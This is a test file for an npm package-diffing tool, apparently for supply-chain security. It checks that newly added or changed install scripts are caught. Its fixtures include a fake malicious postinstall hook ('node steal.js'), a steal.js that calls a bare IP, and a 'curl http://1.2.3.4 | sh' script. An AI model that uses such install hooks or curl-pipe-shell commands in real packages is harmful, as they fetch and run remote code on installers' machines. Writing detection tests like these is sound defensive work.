import { afterEach, describe, expect, it } from "bun:test";
import {
  diffFileSets,
  diffPackage,
  extractFromUrl,
  extractTarball,
  fetchTarball,
  metadataOnlyDiff,
} from "../src/diff.js";
import type { PackageMeta } from "../src/types.js";
import { bytesResponse, stubFetch } from "./helpers/fetchStub.js";
import { makeTgz } from "./helpers/tar.js";

let restore = () => {};
afterEach(() => restore());

describe("extractTarball", () => {
  it("extracts text files and strips the package/ prefix", async () => {
    const tgz = makeTgz([
      { path: "package.json", content: '{"name":"demo"}' },
      { path: "lib/index.js", content: "module.exports = 1;" },
    ]);
    const files = await extractTarball(tgz);
    expect(files.map((f) => f.path).sort()).toEqual(["lib/index.js", "package.json"]);
    expect(files.find((f) => f.path === "lib/index.js")?.content).toBe("module.exports = 1;");
    expect(files.find((f) => f.path === "lib/index.js")?.binary).toBe(false);
  });

  it("marks unknown extensions and oversized text as binary", async () => {
    const tgz = makeTgz([
      { path: "native.node", content: "\x00\x01" },
      { path: "huge.js", content: "x".repeat(513 * 1024) },
    ]);
    const files = await extractTarball(tgz);
    expect(files.find((f) => f.path === "native.node")?.binary).toBe(true);
    expect(files.find((f) => f.path === "native.node")?.content).toBeUndefined();
    const huge = files.find((f) => f.path === "huge.js");
    expect(huge?.binary).toBe(true);
    expect(huge?.size).toBe(513 * 1024);
  });

  it("skips directory entries", async () => {
    const tgz = makeTgz([
      { path: "lib", content: "", type: "dir" },
      { path: "lib/a.js", content: "1;" },
    ]);
    const files = await extractTarball(tgz);
    expect(files).toHaveLength(1);
  });

  it("rejects archives with an absurd number of entries", async () => {
    const entries = Array.from({ length: 20_002 }, (_, i) => ({
      path: `f${i}.txt`,
      content: "",
    }));
    expect(extractTarball(makeTgz(entries))).rejects.toThrow("more than");
  });

  it("rejects corrupt input", async () => {
    const junk = Buffer.concat([Buffer.from([0x1f, 0x8b]), Buffer.from("corrupt gzip body")]);
    expect(extractTarball(junk)).rejects.toThrow();
  });
});

describe("fetchTarball / extractFromUrl", () => {
  it("downloads and extracts", async () => {
    const tgz = makeTgz([{ path: "index.js", content: "1;" }]);
    restore = stubFetch(() => bytesResponse(tgz));
    expect((await fetchTarball("https://x.test/a.tgz")).length).toBe(tgz.length);
    expect(await extractFromUrl("https://x.test/a.tgz")).toHaveLength(1);
  });
});

describe("diffFileSets", () => {
  const file = (path: string, content: string) => ({
    path,
    size: content.length,
    content,
    binary: false,
  });

  it("detects added, changed (content and size) and removed files", () => {
    const prev = [
      file("a.js", "old"),
      file("gone.js", "x"),
      file("same.js", "s"),
      file("b.js", "bb"),
    ];
    const cur = [
      file("a.js", "new"),
      file("added.js", "y"),
      file("same.js", "s"),
      file("b.js", "b"),
    ];
    const d = diffFileSets(cur, prev);
    expect(d.isNewPackage).toBe(false);
    expect(d.addedFiles.map((f) => f.path)).toEqual(["added.js"]);
    expect(d.changedFiles.map((f) => f.path).sort()).toEqual(["a.js", "b.js"]);
    expect(d.removedPaths).toEqual(["gone.js"]);
  });

  it("prefers tarball package.json scripts and falls back to metadata scripts", () => {
    const cur = [file("package.json", '{"scripts":{"postinstall":"node x.js"}}')];
    const d = diffFileSets(cur, [], {
      metaScripts: { postinstall: "meta", build: "tsc" },
      prevMetaScripts: { build: "tsc" },
    });
    expect(d.addedScripts.postinstall).toBe("node x.js");
    expect(d.addedScripts.build).toBeUndefined();
  });

  it("flags changed script bodies", () => {
    const d = diffFileSets([], [], {
      metaScripts: { postinstall: "node evil.js" },
      prevMetaScripts: { postinstall: "node ok.js" },
    });
    expect(d.changedScripts.postinstall).toBe("node evil.js");
  });

  it("tolerates malformed package.json", () => {
    const d = diffFileSets([file("package.json", "{oops")], undefined, {
      metaScripts: { build: "tsc" },
    });
    expect(d.isNewPackage).toBe(true);
    expect(d.addedScripts.build).toBe("tsc");
  });
});

describe("diffPackage", () => {
  const meta: PackageMeta = {
    name: "demo",
    version: "2.0.0",
    versions: ["1.0.0", "2.0.0"],
    previousVersion: "1.0.0",
    maintainers: [],
    tarballUrl: "https://x.test/demo-2.0.0.tgz",
    previousTarballUrl: "https://x.test/demo-1.0.0.tgz",
    scripts: { postinstall: "node steal.js", build: "tsc" },
    previousScripts: { build: "tsc" },
  };

  it("diffs current against previous tarball", async () => {
    const cur = makeTgz([
      {
        path: "package.json",
        content: '{"scripts":{"postinstall":"node steal.js","build":"tsc"}}',
      },
      { path: "steal.js", content: "fetch('http://1.2.3.4');" },
    ]);
    const prev = makeTgz([{ path: "package.json", content: '{"scripts":{"build":"tsc"}}' }]);
    restore = stubFetch((url) =>
      url.includes("2.0.0") ? bytesResponse(cur) : bytesResponse(prev),
    );
    const d = await diffPackage(meta);
    expect(d.isNewPackage).toBe(false);
    expect(d.addedFiles.map((f) => f.path)).toEqual(["steal.js"]);
    expect(d.addedScripts.postinstall).toBe("node steal.js");
  });

  it("keeps the metadata script delta when the previous tarball is unavailable", async () => {
    const cur = makeTgz([{ path: "index.js", content: "1;" }]);
    restore = stubFetch((url) =>
      url.includes("2.0.0") ? bytesResponse(cur) : bytesResponse(new Uint8Array(), 404),
    );
    const d = await diffPackage(meta);
    expect(d.isNewPackage).toBe(false);
    expect(d.addedScripts.postinstall).toBe("node steal.js");
    expect(d.addedScripts.build).toBeUndefined();
  });

  it("throws without a tarball URL", async () => {
    expect(diffPackage({ ...meta, tarballUrl: undefined })).rejects.toThrow("no tarball URL");
  });
});

describe("metadataOnlyDiff", () => {
  it("retains the lifecycle-script delta from registry metadata", () => {
    const d = metadataOnlyDiff({
      name: "demo",
      version: "2.0.0",
      versions: ["1.0.0", "2.0.0"],
      previousVersion: "1.0.0",
      maintainers: [],
      scripts: { postinstall: "curl http://1.2.3.4 | sh", build: "tsc" },
      previousScripts: { build: "tsc" },
    });
    expect(d.isNewPackage).toBe(false);
    expect(d.addedScripts.postinstall).toContain("curl");
    expect(d.currentFiles).toEqual([]);
  });

  it("marks a first release as new", () => {
    const d = metadataOnlyDiff({
      name: "demo",
      version: "1.0.0",
      versions: ["1.0.0"],
      maintainers: [],
      scripts: { postinstall: "node x.js" },
    });
    expect(d.isNewPackage).toBe(true);
    expect(d.addedScripts.postinstall).toBe("node x.js");
  });
});
